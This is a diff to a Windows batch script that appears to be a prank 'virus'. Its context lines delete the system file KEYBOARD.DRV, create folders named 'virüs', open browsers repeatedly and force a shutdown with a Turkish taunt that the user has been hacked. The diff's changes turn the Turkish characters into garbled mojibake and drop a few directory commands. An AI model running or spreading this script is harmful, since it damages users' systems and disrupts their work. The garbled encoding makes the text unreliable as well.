@@ -1,20 +1,20 @@
 del C:/WINDOWS/system/KEYBOARD.DRV
 
-md virüs1
-md virüs2
-md virüs3
-md virüs4
-md virüs5
-md virüs6
-md virüs7
-md virüs8
-md virüs9
-md virüs0
-md virüs10
-md virüs11
-md virüs12
-md virüs13
-md virüs14
+md virÃ¼s1
+md virÃ¼s2
+md virÃ¼s3
+md virÃ¼s4
+md virÃ¼s5
+md virÃ¼s6
+md virÃ¼s7
+md virÃ¼s8
+md virÃ¼s9
+md virÃ¼s0
+md virÃ¼s10
+md virÃ¼s11
+md virÃ¼s12
+md virÃ¼s13
+md virÃ¼s14
 
 color a
 
@@ -69,10 +69,6 @@ start chrome
 start chrome
 start firefox
 
-cd..
-
-c..
-
 dir /S
 
-shutdown -s -t 30 -c '' HACKER TARAFINDAN HACKLENDİN MORUQ!!! ''
+shutdown -s -t 30 -c '' HACKER TARAFINDAN HACKLENDÃN MORUQ!!! ''
